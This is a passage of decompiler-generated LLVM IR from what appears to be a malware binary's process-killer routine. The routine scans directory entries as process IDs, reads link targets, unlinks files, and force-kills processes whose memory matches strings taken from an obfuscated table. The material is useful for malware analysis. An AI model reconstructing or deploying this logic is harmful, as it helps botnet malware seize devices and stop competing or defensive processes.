  %stack_var_-8420.1121 = phi i32 [ %stack_var_-8420.1.be, %dec_label_pc_10670.backedge ], [ %stack_var_-8420.0, %dec_label_pc_10668 ]
  br label %dec_label_pc_10680

dec_label_pc_10680:                               ; preds = %dec_label_pc_10680.preheader, %dec_label_pc_106e8
  %v0_10690 = phi i32 [ %v1_106f4, %dec_label_pc_106e8 ], [ %v0_10680132, %dec_label_pc_10680.preheader ]
  %stack_var_-8420.2 = phi i32 [ %v1_106a4, %dec_label_pc_106e8 ], [ %stack_var_-8420.1121, %dec_label_pc_10680.preheader ]
  %v1_10680 = add i32 %v0_10690, 11
  %v2_10680 = inttoptr i32 %v1_10680 to i8*
  %v3_10680 = load i8, i8* %v2_10680, align 1
  %v4_10680 = zext i8 %v3_10680 to i32
  %v1_10684 = add nsw i32 %v4_10680, -48
  store i32 %v1_10684, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_10684, 9
  br i1 %tmp, label %dec_label_pc_10670.backedge, label %dec_label_pc_10690

dec_label_pc_10690:                               ; preds = %dec_label_pc_10680
  store i32 %v1_10680, i32* @r6, align 4
  %v1_10698 = call i32 @_atoi(i32 %v1_10680)
  %v0_106a0 = load i32, i32* @r5, align 4
  %v1_106a4 = add i32 %stack_var_-8420.2, 1
  store i32 %v1_106a4, i32* %r2.global-to-local, align 4
  store i32 %v1_10698, i32* @r7, align 4
  %v5_106b0 = icmp slt i32 %v0_106a0, %v1_10698
  %v1_10710 = call i32 @_time(i32 0)
  br i1 %v5_106b0, label %dec_label_pc_1070c, label %dec_label_pc_106b4

dec_label_pc_106b4:                               ; preds = %dec_label_pc_10690
  %v0_106bc = load i32, i32* @r4, align 4
  %v2_106bc = sub i32 %v1_10710, %v0_106bc
  %v7_106c4 = icmp slt i32 %v2_106bc, 601
  br i1 %v7_106c4, label %dec_label_pc_106cc, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_106b4
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_10670.backedge

dec_label_pc_106cc:                               ; preds = %dec_label_pc_106b4
  %v0_106cc = load i32, i32* @r7, align 4
  %v7_106d0 = icmp slt i32 %v0_106cc, 401
  br i1 %v7_106d0, label %dec_label_pc_10670.backedge, label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %dec_label_pc_106cc
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_106dc = urem i32 %v1_106a4, 10
  %v2_106e0 = icmp eq i32 %v2_106dc, 0
  br i1 %v2_106e0, label %dec_label_pc_106e8, label %dec_label_pc_10670.backedge

dec_label_pc_106e8:                               ; preds = %dec_label_pc_106d4
  %v1_106ec = call i32 @_sleep(i32 1)
  %v0_106f0 = load i32, i32* %sl.global-to-local, align 4
  %v1_106f4 = call i32 @_readdir(i32 %v0_106f0)
  %v2_106f8 = icmp eq i32 %v1_106f4, 0
  br i1 %v2_106f8, label %dec_label_pc_10700, label %dec_label_pc_10680

dec_label_pc_10700:                               ; preds = %dec_label_pc_10670.backedge, %dec_label_pc_106e8, %dec_label_pc_10668
  %stack_var_-8420.3 = phi i32 [ %stack_var_-8420.0, %dec_label_pc_10668 ], [ %v1_106a4, %dec_label_pc_106e8 ], [ %stack_var_-8420.1.be, %dec_label_pc_10670.backedge ]
  %v0_10700 = load i32, i32* %sl.global-to-local, align 4
  %v1_10704 = call i32 @_closedir(i32 %v0_10700)
  br label %dec_label_pc_10648

dec_label_pc_1070c:                               ; preds = %dec_label_pc_10690
  %v1_1071c = call i32 @function_13ce8(i32 6)
  %v1_10724 = call i32 @function_13ce8(i32 7)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_10730 = call i32 @function_13c04(i32 6, i32* null)
  store i32 %v3_10730, i32* %r1.global-to-local, align 4
  store i32 %v2_1073c, i32* @r0, align 4
  %v3_10740 = call i32 @function_14634(i8* %v2_10740, i32 %v3_10730)
  store i32 %v2_1073c, i32* %r3.global-to-local, align 4
  %v2_1074c = add i32 %v3_10740, %v2_1073c
  store i32 %v2_1074c, i32* %r5.global-to-local, align 4
  %v0_10750 = load i32, i32* @r6, align 4
  store i32 %v0_10750, i32* %r1.global-to-local, align 4
  store i32 %v2_1074c, i32* @r0, align 4
  %v2_10758 = inttoptr i32 %v2_1074c to i8*
  %v3_10758 = call i32 @function_14634(i8* %v2_10758, i32 %v0_10750)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_10768 = call i32 @function_13c04(i32 7, i32* null)
  store i32 %v3_10768, i32* %r1.global-to-local, align 4
  %v0_10770 = load i32, i32* %r5.global-to-local, align 4
  %v2_10770 = add i32 %v3_10758, %v0_10770
  store i32 %v2_10770, i32* @r0, align 4
  %v2_10774 = inttoptr i32 %v2_10770 to i8*
  %v3_10774 = call i32 @function_14634(i8* %v2_10774, i32 %v3_10768)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_10780 = call i32 @function_13c04(i32 6, i32* null)
  store i32 %v3_10780, i32* %r1.global-to-local, align 4
  store i32 %v2_1078c, i32* @r0, align 4
  %v3_10790 = call i32 @function_14634(i8* %v2_10790, i32 %v3_10780)
  %v2_1079c = add i32 %v3_10790, %v2_1078c
  store i32 %v2_1079c, i32* @r5, align 4
  %v0_107a0 = load i32, i32* @r6, align 4
  store i32 %v0_107a0, i32* %r1.global-to-local, align 4
  store i32 %v2_1079c, i32* @r0, align 4
  %v2_107a8 = inttoptr i32 %v2_1079c to i8*
  %v3_107a8 = call i32 @function_14634(i8* %v2_107a8, i32 %v0_107a0)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_107a8, i32* @r4, align 4
  %v3_107b8 = call i32 @function_13c04(i32 11, i32* null)
  store i32 %v3_107b8, i32* %r1.global-to-local, align 4
  %v0_107c0 = load i32, i32* @r5, align 4
  %v1_107c0 = load i32, i32* @r4, align 4
  %v2_107c0 = add i32 %v1_107c0, %v0_107c0
  store i32 %v2_107c0, i32* @r0, align 4
  %v2_107c4 = inttoptr i32 %v2_107c0 to i8*
  %v3_107c4 = call i32 @function_14634(i8* %v2_107c4, i32 %v3_107b8)
  %v1_107cc = call i32 @function_13c30(i32 6)
  %v1_107d4 = call i32 @function_13c30(i32 7)
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_107e8 = load i32, i32* %stack_var_-8428, align 4
  store i32 %v2_107e8, i32* %r1.global-to-local, align 4
  %v3_107ec = call i32 @_readlink(i32 %v2_1073c, i32 %v2_107e8, i32 4095)
  %v7_107f4 = icmp eq i32 %v3_107ec, -1
  store i32 %v3_107ec, i32* @r5, align 4
  store i32 -4276, i32* %r2.global-to-local, align 4
  br i1 %v7_107f4, label %dec_label_pc_108bc, label %dec_label_pc_10804

dec_label_pc_10804:                               ; preds = %dec_label_pc_1070c
  store i32 %v2_10808, i32* %r1.global-to-local, align 4
  %v2_1080c = add i32 %v3_107ec, %v2_10808
  store i32 %v2_1080c, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_10814 = add i32 %v2_1080c, -4276
  %v5_10814 = inttoptr i32 %v4_10814 to i8*
  store i8 0, i8* %v5_10814, align 1
  %v1_1081c = call i32 @function_13ce8(i32 10)
  %v0_10820 = load i32, i32* @r4, align 4
  store i32 %v0_10820, i32* %r1.global-to-local, align 4
  %v2_10828 = inttoptr i32 %v0_10820 to i32*
  %v3_10828 = call i32 @function_13c04(i32 10, i32* %v2_10828)
  %v0_1082c = load i32, i32* @r5, align 4
  %v1_1082c = add i32 %v0_1082c, -1
  store i32 %v1_1082c, i32* @r1, align 4
  store i32 %v3_10828, i32* %r2.global-to-local, align 4
  %v2_10834 = load i32, i32* %stack_var_-8428, align 4
  %v3_10838 = inttoptr i32 %v2_10834 to i8*
  %v4_10838 = call i32 @function_14960(i8* %v3_10838, i32 %v1_1082c, i32 %v3_10828)
  %v7_1083c = icmp eq i32 %v4_10838, -1
  br i1 %v7_1083c, label %dec_label_pc_10858, label %dec_label_pc_10844

dec_label_pc_10844:                               ; preds = %dec_label_pc_10804
  %v2_10844 = load i32, i32* %stack_var_-8428, align 4
  %v1_10848 = call i32 @_unlink(i32 %v2_10844)
  %v0_1084c = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_10854 = call i32 @_kill(i32 %v0_1084c, i32 9)
  br label %dec_label_pc_10858

dec_label_pc_10858:                               ; preds = %dec_label_pc_10804, %dec_label_pc_10844
  %v1_1085c = call i32 @function_13c30(i32 10)
  %v1_10860 = call i32 @_getpid(i32 %v1_1085c)
  %v0_10864 = load i32, i32* @r7, align 4
  %v9_10864 = icmp eq i32 %v0_10864, %v1_10860
  br i1 %v9_10864, label %dec_label_pc_10890, label %dec_label_pc_1086c

dec_label_pc_1086c:                               ; preds = %dec_label_pc_10858
  %v0_1086c = call i32 @_getppid()
  %v0_10870 = load i32, i32* @r7, align 4
  %v9_10870 = icmp eq i32 %v0_10870, %v0_1086c
  br i1 %v9_10870, label %dec_label_pc_10890, label %dec_label_pc_10878

dec_label_pc_10878:                               ; preds = %dec_label_pc_1086c
  store i32 ptrtoint (i32* @global_var_1d9b0.163 to i32), i32* %r2.global-to-local, align 4
  %v2_1087c = load i32, i32* %stack_var_-8428, align 4
  %v2_10880 = load i32, i32* @global_var_1d9b0.163, align 4
  store i32 %v2_10880, i32* %r1.global-to-local, align 4
  %v2_10884 = inttoptr i32 %v2_1087c to i8*
  %v3_10884 = call i32 @function_149ec(i8* %v2_10884, i32 %v2_10880)
  %v2_10888 = icmp eq i32 %v3_10884, 0
  br i1 %v2_10888, label %dec_label_pc_1089c, label %dec_label_pc_10878.dec_label_pc_10890_crit_edge

dec_label_pc_10878.dec_label_pc_10890_crit_edge:  ; preds = %dec_label_pc_10878
  %v0_10894.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10890

dec_label_pc_10890:                               ; preds = %dec_label_pc_10878.dec_label_pc_10890_crit_edge, %dec_label_pc_1086c, %dec_label_pc_10858
  %v0_10894 = phi i32 [ %v0_10894.pre, %dec_label_pc_10878.dec_label_pc_10890_crit_edge ], [ %v0_1086c, %dec_label_pc_1086c ], [ %v1_10860, %dec_label_pc_10858 ]
  store i32 %v1_10710, i32* @r4, align 4
  store i32 %v0_10894, i32* @r5, align 4
  br label %dec_label_pc_10670.backedge

dec_label_pc_10670.backedge:                      ; preds = %dec_label_pc_106d4, %dec_label_pc_106cc, %dec_label_pc_10680, %dec_label_pc_10890, %dec_label_pc_10b40, %.thread11
  %stack_var_-8420.1.be = phi i32 [ %v1_106a4, %dec_label_pc_10b40 ], [ %v1_106a4, %dec_label_pc_10890 ], [ %v1_106a4, %.thread11 ], [ %stack_var_-8420.2, %dec_label_pc_10680 ], [ %v1_106a4, %dec_label_pc_106cc ], [ %v1_106a4, %dec_label_pc_106d4 ]
  %v0_10670 = load i32, i32* %sl.global-to-local, align 4
  %v1_10674 = call i32 @_readdir(i32 %v0_10670)
  %v2_10678 = icmp eq i32 %v1_10674, 0
  br i1 %v2_10678, label %dec_label_pc_10700, label %dec_label_pc_10680.preheader

dec_label_pc_1089c:                               ; preds = %dec_label_pc_10878
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_108a0 = load i32, i32* %stack_var_-8428, align 4
  %v2_108a4 = call i32 @_open(i32 %v2_108a0, i32 0)
  %v7_108a8 = icmp eq i32 %v2_108a4, -1
  store i32 %v2_108a4, i32* @r4, align 4
  br i1 %v7_108a8, label %dec_label_pc_10b74, label %dec_label_pc_108b4

dec_label_pc_108b4:                               ; preds = %dec_label_pc_1089c, %dec_label_pc_10b74
  %v0_108b4 = phi i32 [ %v2_108a4, %dec_label_pc_1089c ], [ %v0_108b4.pre, %dec_label_pc_10b74 ]
  %v1_108b8 = call i32 @_close(i32 %v0_108b4)
  br label %dec_label_pc_108bc

dec_label_pc_108bc:                               ; preds = %dec_label_pc_1070c, %dec_label_pc_108b4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_108c8 = call i32 @_open(i32 %v2_1073c, i32 0)
  %v7_108cc = icmp eq i32 %v2_108c8, -1
  br i1 %v7_108cc, label %dec_label_pc_10b40, label %dec_label_pc_108d8

dec_label_pc_108d8:                               ; preds = %dec_label_pc_108bc
  %v1_108dc = call i32 @function_13ce8(i32 12)
  %v1_108e4 = call i32 @function_13ce8(i32 13)
  %v1_108ec = call i32 @function_13ce8(i32 14)
  %v1_108f4 = call i32 @function_13ce8(i32 15)
  %v1_108fc = call i32 @function_13ce8(i32 16)
  store i32 %v2_10900, i32* %r1.global-to-local, align 4
  %v3_10908 = call i32 @function_13c04(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v2_10910, i32* %r1.global-to-local, align 4
  store i32 %v3_10908, i32* @r5, align 4
  %v3_1091c = call i32 @function_13c04(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v2_10924, i32* %r1.global-to-local, align 4
  store i32 %v3_1091c, i32* @r6, align 4
  %v3_10930 = call i32 @function_13c04(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v2_10938, i32* %r1.global-to-local, align 4
  store i32 %v3_10930, i32* %sb.global-to-local, align 4
  %v3_10944 = call i32 @function_13c04(i32 15, i32* nonnull %stack_var_-40)
  store i32 %v3_10944, i32* %fp.global-to-local, align 4
  store i32 %v2_10950, i32* %r1.global-to-local, align 4
  %v3_10958 = call i32 @function_13c04(i32 16, i32* nonnull %stack_var_-56)
  store i32 %v2_10578, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v3_1096c114 = call i32 @_read(i32 %v2_108c8, i32 %v2_10578, i32 4096)
  %tmp216 = icmp slt i32 %v3_1096c114, 1
  br i1 %tmp216, label %dec_label_pc_10b84, label %dec_label_pc_10978

dec_label_pc_10978:                               ; preds = %dec_label_pc_108d8, %dec_label_pc_10960.backedge
  %v0_10a00105 = phi i32 [ %v3_1096c, %dec_label_pc_10960.backedge ], [ %v3_1096c114, %dec_label_pc_108d8 ]
  store i32 %v2_1047c, i32* %r3.global-to-local, align 4
  %v3_1097c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1097c, i32* @r4, align 4
  %v5_10984 = icmp slt i32 %v0_10a00105, %v3_1097c
  br i1 %v5_10984, label %dec_label_pc_10994, label %dec_label_pc_10a40.lr.ph

dec_label_pc_10a40.lr.ph:                         ; preds = %dec_label_pc_10978
  %v1_10a3870 = add i32 %v0_10a00105, -1
  store i32 %v1_10a3870, i32* %r1.global-to-local, align 4
  %v0_10a40.pre = load i32, i32* @r5, align 4
  %v1_10a44.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10a40

dec_label_pc_10994:                               ; preds = %dec_label_pc_10a38.backedge, %dec_label_pc_10978
  %v3_10998 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10998, i32* @r4, align 4
  %v5_109a0 = icmp slt i32 %v0_10a00105, %v3_10998
  br i1 %v5_109a0, label %dec_label_pc_109b0, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_10994
  %v1_10a6c79 = add i32 %v0_10a00105, -1
  store i32 %v1_10a6c79, i32* %r1.global-to-local, align 4
  %v2_10a6c80 = icmp eq i32 %v0_10a00105, 0
  br i1 %v2_10a6c80, label %dec_label_pc_109b0, label %dec_label_pc_10a74.lr.ph

dec_label_pc_10a74.lr.ph:                         ; preds = %.thread28
  %v0_10a74.pre = load i32, i32* @r6, align 4
  %v1_10a78.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10a74

dec_label_pc_109b0:                               ; preds = %dec_label_pc_10a6c.backedge, %.thread28, %dec_label_pc_10994
  store i32 %v2_1047c, i32* %r1.global-to-local, align 4
  %v3_109b4 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_109b4, i32* @r4, align 4
  %v5_109bc = icmp slt i32 %v0_10a00105, %v3_109b4
  br i1 %v5_109bc, label %dec_label_pc_109cc, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_109b0
  %v1_10aa088 = add i32 %v0_10a00105, -1
  store i32 %v1_10aa088, i32* %r1.global-to-local, align 4
  %v2_10aa089 = icmp eq i32 %v0_10a00105, 0
  br i1 %v2_10aa089, label %dec_label_pc_109cc, label %dec_label_pc_10aa8.lr.ph

dec_label_pc_10aa8.lr.ph:                         ; preds = %.thread37
  %v0_10aa8.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_10aac.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10aa8

dec_label_pc_109cc:                               ; preds = %dec_label_pc_10aa0.backedge, %.thread37, %dec_label_pc_109b0
  store i32 %v2_1047c, i32* %r2.global-to-local, align 4
  %v3_109d0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_109d0, i32* @r4, align 4
  %v5_109d8 = icmp slt i32 %v0_10a00105, %v3_109d0
  br i1 %v5_109d8, label %dec_label_pc_109e8, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_109cc
  %v1_10ad497 = add i32 %v0_10a00105, -1
  store i32 %v1_10ad497, i32* %r1.global-to-local, align 4
  %v2_10ad498 = icmp eq i32 %v0_10a00105, 0
  br i1 %v2_10ad498, label %dec_label_pc_109e8, label %dec_label_pc_10adc.lr.ph

dec_label_pc_10adc.lr.ph:                         ; preds = %.thread46
  %v0_10adc.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_10ae0.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10adc

dec_label_pc_109e8:                               ; preds = %dec_label_pc_10ad4.backedge, %.thread46, %dec_label_pc_109cc
  store i32 %v2_1047c, i32* %r3.global-to-local, align 4
  %v3_109ec = load i32, i32* %stack_var_-56, align 4
  %v5_109f4 = icmp slt i32 %v0_10a00105, %v3_109ec
  br i1 %v5_109f4, label %dec_label_pc_10960.backedge, label %.thread52

dec_label_pc_10960.backedge:                      ; preds = %dec_label_pc_10a24, %.thread52, %dec_label_pc_109e8
  store i32 %v2_10578, i32* %r1.global-to-local, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v3_1096c = call i32 @_read(i32 %v2_108c8, i32 %v2_10578, i32 4096)
  %tmp217 = icmp slt i32 %v3_1096c, 1
  br i1 %tmp217, label %dec_label_pc_10b84, label %dec_label_pc_10978

.thread52:                                        ; preds = %dec_label_pc_109e8
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_10a00107 = icmp eq i32 %v0_10a00105, 0
  br i1 %v2_10a00107, label %dec_label_pc_10960.backedge, label %dec_label_pc_10a08.lr.ph

dec_label_pc_10a08.lr.ph:                         ; preds = %.thread52
  %v1_10a10.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10a08

dec_label_pc_10a08:                               ; preds = %dec_label_pc_10a24, %dec_label_pc_10a08.lr.ph
  %v0_10a00.in = phi i32 [ %v0_10a00105, %dec_label_pc_10a08.lr.ph ], [ %v0_10a00, %dec_label_pc_10a24 ]
  %v0_10a24 = phi i32 [ 0, %dec_label_pc_10a08.lr.ph ], [ %v1_10a24, %dec_label_pc_10a24 ]
  %v0_10a18 = phi i32 [ 0, %dec_label_pc_10a08.lr.ph ], [ %v1_10a18., %dec_label_pc_10a24 ]
  %v0_10a00 = add i32 %v0_10a00.in, -1
  store i32 %v3_10958, i32* %r3.global-to-local, align 4
  %v2_10a0c = add i32 %v0_10a18, %v3_10958
  %v3_10a0c = inttoptr i32 %v2_10a0c to i8*
  %v4_10a0c = load i8, i8* %v3_10a0c, align 1
  %v6_10a0c = zext i8 %v4_10a0c to i32
  store i32 %v6_10a0c, i32* %r2.global-to-local, align 4
  %v2_10a10 = add i32 %v0_10a24, %v1_10a10.pre
  %v3_10a10 = inttoptr i32 %v2_10a10 to i8*
  %v4_10a10 = load i8, i8* %v3_10a10, align 1
  %v6_10a10 = zext i8 %v4_10a10 to i32
  store i32 %v6_10a10, i32* %r3.global-to-local, align 4
  %v9_10a14 = icmp eq i8 %v4_10a10, %v4_10a0c
  %v1_10a18 = add i32 %v0_10a18, 1
  %v1_10a18. = select i1 %v9_10a14, i32 %v1_10a18, i32 0
  store i32 %v1_10a18., i32* %r1.global-to-local, align 4
  br i1 %v9_10a14, label %dec_label_pc_10afc, label %dec_label_pc_10a24

dec_label_pc_10a24:                               ; preds = %dec_label_pc_10afc, %dec_label_pc_10a08
  %v1_10a24 = add i32 %v0_10a24, 1
  %v2_10a00 = icmp eq i32 %v0_10a00, 0
  br i1 %v2_10a00, label %dec_label_pc_10960.backedge, label %dec_label_pc_10a08

dec_label_pc_10a2c:                               ; preds = %dec_label_pc_10a40
  %v9_10a2c = icmp eq i32 %v3_1097c, %v1_10a4c.
  br i1 %v9_10a2c, label %dec_label_pc_10b04, label %dec_label_pc_10a38.backedge

dec_label_pc_10a38.backedge:                      ; preds = %dec_label_pc_10a40, %dec_label_pc_10a2c
  %storemerge124 = add i32 %storemerge124.in, 1
  %v1_10a38 = add i32 %v0_10a38, -1
  store i32 %v1_10a38, i32* %r1.global-to-local, align 4
  %v2_10a38 = icmp eq i32 %v0_10a38, 0
  br i1 %v2_10a38, label %dec_label_pc_10994, label %dec_label_pc_10a40

dec_label_pc_10a40:                               ; preds = %dec_label_pc_10a38.backedge, %dec_label_pc_10a40.lr.ph
  %v0_10a38 = phi i32 [ %v1_10a3870, %dec_label_pc_10a40.lr.ph ], [ %v1_10a38, %dec_label_pc_10a38.backedge ]
  %storemerge124.in = phi i32 [ 0, %dec_label_pc_10a40.lr.ph ], [ %storemerge124, %dec_label_pc_10a38.backedge ]
  %v0_10a4c = phi i32 [ 0, %dec_label_pc_10a40.lr.ph ], [ %v1_10a4c., %dec_label_pc_10a38.backedge ]
  %v2_10a40 = add i32 %v0_10a4c, %v0_10a40.pre
  %v3_10a40 = inttoptr i32 %v2_10a40 to i8*
  %v4_10a40 = load i8, i8* %v3_10a40, align 1
  %v6_10a40 = zext i8 %v4_10a40 to i32
  store i32 %v6_10a40, i32* %r2.global-to-local, align 4
  %v2_10a44 = add i32 %storemerge124.in, %v1_10a44.pre
  %v3_10a44 = inttoptr i32 %v2_10a44 to i8*
  %v4_10a44 = load i8, i8* %v3_10a44, align 1
  %v6_10a44 = zext i8 %v4_10a44 to i32
  store i32 %v6_10a44, i32* %r3.global-to-local, align 4
  %v9_10a48 = icmp eq i8 %v4_10a44, %v4_10a40
  %v1_10a4c = add i32 %v0_10a4c, 1
  %v1_10a4c. = select i1 %v9_10a48, i32 %v1_10a4c, i32 0
  br i1 %v9_10a48, label %dec_label_pc_10a2c, label %dec_label_pc_10a38.backedge

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a74
  %v9_10a60 = icmp eq i32 %v3_10998, %v1_10a80.
  br i1 %v9_10a60, label %dec_label_pc_10b04, label %dec_label_pc_10a6c.backedge

dec_label_pc_10a6c.backedge:                      ; preds = %dec_label_pc_10a74, %dec_label_pc_10a60
  %storemerge123 = add i32 %storemerge123.in, 1
  %v1_10a6c = add i32 %v0_10a6c, -1
  store i32 %v1_10a6c, i32* %r1.global-to-local, align 4
  %v2_10a6c = icmp eq i32 %v0_10a6c, 0
  br i1 %v2_10a6c, label %dec_label_pc_109b0, label %dec_label_pc_10a74

dec_label_pc_10a74:                               ; preds = %dec_label_pc_10a6c.backedge, %dec_label_pc_10a74.lr.ph
  %v0_10a6c = phi i32 [ %v1_10a6c79, %dec_label_pc_10a74.lr.ph ], [ %v1_10a6c, %dec_label_pc_10a6c.backedge ]
  %storemerge123.in = phi i32 [ 0, %dec_label_pc_10a74.lr.ph ], [ %storemerge123, %dec_label_pc_10a6c.backedge ]
  %v0_10a80 = phi i32 [ 0, %dec_label_pc_10a74.lr.ph ], [ %v1_10a80., %dec_label_pc_10a6c.backedge ]
  %v2_10a74 = add i32 %v0_10a80, %v0_10a74.pre
  %v3_10a74 = inttoptr i32 %v2_10a74 to i8*
  %v4_10a74 = load i8, i8* %v3_10a74, align 1
  %v6_10a74 = zext i8 %v4_10a74 to i32
  store i32 %v6_10a74, i32* %r2.global-to-local, align 4
  %v2_10a78 = add i32 %storemerge123.in, %v1_10a78.pre
  %v3_10a78 = inttoptr i32 %v2_10a78 to i8*
  %v4_10a78 = load i8, i8* %v3_10a78, align 1
  %v6_10a78 = zext i8 %v4_10a78 to i32
  store i32 %v6_10a78, i32* %r3.global-to-local, align 4
  %v9_10a7c = icmp eq i8 %v4_10a78, %v4_10a74
  %v1_10a80 = add i32 %v0_10a80, 1
  %v1_10a80. = select i1 %v9_10a7c, i32 %v1_10a80, i32 0
  br i1 %v9_10a7c, label %dec_label_pc_10a60, label %dec_label_pc_10a6c.backedge

dec_label_pc_10a94:                               ; preds = %dec_label_pc_10aa8
  %v9_10a94 = icmp eq i32 %v3_109b4, %v1_10ab4.
  br i1 %v9_10a94, label %dec_label_pc_10b04, label %dec_label_pc_10aa0.backedge

dec_label_pc_10aa0.backedge:                      ; preds = %dec_label_pc_10aa8, %dec_label_pc_10a94
  %storemerge122 = add i32 %storemerge122.in, 1
  %v1_10aa0 = add i32 %v0_10aa0, -1
  store i32 %v1_10aa0, i32* %r1.global-to-local, align 4
  %v2_10aa0 = icmp eq i32 %v0_10aa0, 0
  br i1 %v2_10aa0, label %dec_label_pc_109cc, label %dec_label_pc_10aa8

dec_label_pc_10aa8:                               ; preds = %dec_label_pc_10aa0.backedge, %dec_label_pc_10aa8.lr.ph
  %v0_10aa0 = phi i32 [ %v1_10aa088, %dec_label_pc_10aa8.lr.ph ], [ %v1_10aa0, %dec_label_pc_10aa0.backedge ]
  %storemerge122.in = phi i32 [ 0, %dec_label_pc_10aa8.lr.ph ], [ %storemerge122, %dec_label_pc_10aa0.backedge ]
  %v0_10ab4 = phi i32 [ 0, %dec_label_pc_10aa8.lr.ph ], [ %v1_10ab4., %dec_label_pc_10aa0.backedge ]
  %v2_10aa8 = add i32 %v0_10ab4, %v0_10aa8.pre
  %v3_10aa8 = inttoptr i32 %v2_10aa8 to i8*
  %v4_10aa8 = load i8, i8* %v3_10aa8, align 1
  %v6_10aa8 = zext i8 %v4_10aa8 to i32
  store i32 %v6_10aa8, i32* %r2.global-to-local, align 4
  %v2_10aac = add i32 %storemerge122.in, %v1_10aac.pre
  %v3_10aac = inttoptr i32 %v2_10aac to i8*
  %v4_10aac = load i8, i8* %v3_10aac, align 1
  %v6_10aac = zext i8 %v4_10aac to i32
  store i32 %v6_10aac, i32* %r3.global-to-local, align 4
  %v9_10ab0 = icmp eq i8 %v4_10aac, %v4_10aa8
  %v1_10ab4 = add i32 %v0_10ab4, 1
  %v1_10ab4. = select i1 %v9_10ab0, i32 %v1_10ab4, i32 0
  br i1 %v9_10ab0, label %dec_label_pc_10a94, label %dec_label_pc_10aa0.backedge

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10adc
  %v9_10ac8 = icmp eq i32 %v3_109d0, %v1_10ae8.
  br i1 %v9_10ac8, label %dec_label_pc_10b04, label %dec_label_pc_10ad4.backedge

dec_label_pc_10ad4.backedge:                      ; preds = %dec_label_pc_10adc, %dec_label_pc_10ac8
  %storemerge = add i32 %storemerge.in, 1
  %v1_10ad4 = add i32 %v0_10ad4, -1
  store i32 %v1_10ad4, i32* %r1.global-to-local, align 4
  %v2_10ad4 = icmp eq i32 %v0_10ad4, 0
  br i1 %v2_10ad4, label %dec_label_pc_109e8, label %dec_label_pc_10adc

dec_label_pc_10adc:                               ; preds = %dec_label_pc_10ad4.backedge, %dec_label_pc_10adc.lr.ph
  %v0_10ad4 = phi i32 [ %v1_10ad497, %dec_label_pc_10adc.lr.ph ], [ %v1_10ad4, %dec_label_pc_10ad4.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_10adc.lr.ph ], [ %storemerge, %dec_label_pc_10ad4.backedge ]
  %v0_10ae8 = phi i32 [ 0, %dec_label_pc_10adc.lr.ph ], [ %v1_10ae8., %dec_label_pc_10ad4.backedge ]
  %v2_10adc = add i32 %v0_10ae8, %v0_10adc.pre
  %v3_10adc = inttoptr i32 %v2_10adc to i8*
  %v4_10adc = load i8, i8* %v3_10adc, align 1
  %v6_10adc = zext i8 %v4_10adc to i32
  store i32 %v6_10adc, i32* %r2.global-to-local, align 4
  %v2_10ae0 = add i32 %storemerge.in, %v1_10ae0.pre
  %v3_10ae0 = inttoptr i32 %v2_10ae0 to i8*
  %v4_10ae0 = load i8, i8* %v3_10ae0, align 1
  %v6_10ae0 = zext i8 %v4_10ae0 to i32
  store i32 %v6_10ae0, i32* %r3.global-to-local, align 4
  %v9_10ae4 = icmp eq i8 %v4_10ae0, %v4_10adc
  %v1_10ae8 = add i32 %v0_10ae8, 1
  %v1_10ae8. = select i1 %v9_10ae4, i32 %v1_10ae8, i32 0
  br i1 %v9_10ae4, label %dec_label_pc_10ac8, label %dec_label_pc_10ad4.backedge

dec_label_pc_10afc:                               ; preds = %dec_label_pc_10a08
  %v9_10afc = icmp eq i32 %v3_109ec, %v1_10a18.
  br i1 %v9_10afc, label %dec_label_pc_10b04, label %dec_label_pc_10a24

dec_label_pc_10b04:                               ; preds = %dec_label_pc_10a2c, %dec_label_pc_10a60, %dec_label_pc_10a94, %dec_label_pc_10ac8, %dec_label_pc_10afc
  %v1_10b08 = call i32 @function_13c30(i32 12)
  %v1_10b10 = call i32 @function_13c30(i32 13)
  %v1_10b18 = call i32 @function_13c30(i32 14)
  %v1_10b20 = call i32 @function_13c30(i32 15)
  %v1_10b28 = call i32 @function_13c30(i32 16)
  %v1_10b30 = call i32 @_close(i32 %v2_108c8)
  %v0_10b34 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_10b3c = call i32 @_kill(i32 %v0_10b34, i32 9)
  br label %dec_label_pc_10b40

dec_label_pc_10b40:                               ; preds = %dec_label_pc_108bc, %dec_label_pc_10b84, %dec_label_pc_10b04
  store i32 64, i32* %r1.global-to-local, align 4
